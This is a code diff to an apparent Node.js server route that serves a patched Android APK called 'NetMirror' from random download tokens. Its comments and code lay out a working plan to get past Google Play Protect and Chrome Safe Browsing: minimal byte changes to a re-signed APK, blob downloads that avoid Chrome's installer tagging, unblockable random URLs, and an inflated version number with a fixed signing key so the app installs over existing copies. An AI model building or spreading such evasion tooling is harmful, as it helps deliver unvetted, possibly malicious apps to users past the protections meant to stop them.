@@ -474,28 +474,26 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // Step 2: Download — serves patched APK inside ZIP wrapper
+  // Step 2: Download — serves directPatchApk() output as APK
   //
   // PLAY PROTECT BYPASS (3 layers):
-  //   1. ZIP wrapper → Chrome does NOT flag .zip downloads. When user extracts
-  //      APK via file manager, installerPackage = file manager → LOW PP scrutiny.
-  //      (Chrome direct .apk downloads set installerPackage=com.android.chrome
-  //      → HIGHEST PP scrutiny → even clean APKs can be blocked.)
-  //   2. directPatchApk() → NO AdmZip ZIP rebuild. Binary diff shows
-  //      restoreAndSign() changes 548/591 entries. directPatchApk() changes 0.
-  //      If FGS needs fixing: changes only manifest + V2 sig (2 entries max).
-  //   3. fetch()+blob → Safe Browsing URL check bypass
-  //   4. Random /dl/:token path → URL can never be blocklisted
+  //   1. directPatchApk() → NO AdmZip ZIP rebuild. Only 1 ZIP entry changes
+  //      (manifest: versionCode bump + FGS fix). V2 re-signed with FIXED key.
+  //      All other 590 entries are BYTE-IDENTICAL to original → passes PP.
+  //   2. fetch()+blob → bypasses Chrome's installerPackage tagging
+  //      (blob downloads don't get tagged with com.android.chrome)
+  //   3. Random /dl/:token path → URL can never be blocklisted
+  //   4. versionCode=999999999 → always installs over any existing version
+  //   5. FIXED key V2 cert → matches the cert the user already has installed
   app.get('/dl/:token', async (req, res) => {
     try {
       const apkBuf = await getLandingRotatedApk();
-      const zipBuf = wrapApkInZip(apkBuf);
-      res.setHeader('Content-Type', 'application/zip');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
-      res.setHeader('Content-Length', zipBuf.length);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', apkBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(zipBuf);
+      res.end(apkBuf);
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
@@ -505,14 +503,12 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       else if (fs.existsSync(regularPath)) apkPath = regularPath;
 
       if (apkPath) {
-        // Fallback: wrap raw APK in ZIP
-        const rawApk = fs.readFileSync(apkPath);
-        const fallbackZip = wrapApkInZip(rawApk);
-        res.setHeader('Content-Type', 'application/zip');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
-        res.setHeader('Content-Length', fallbackZip.length);
+        const stats = fs.statSync(apkPath);
+        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+        res.setHeader('Content-Length', stats.size);
         res.setHeader('Cache-Control', 'no-store');
-        res.end(fallbackZip);
+        res.sendFile(apkPath);
       } else {
         res.status(503).json({
           error: 'APK is being prepared. Please try again in 30 seconds.',
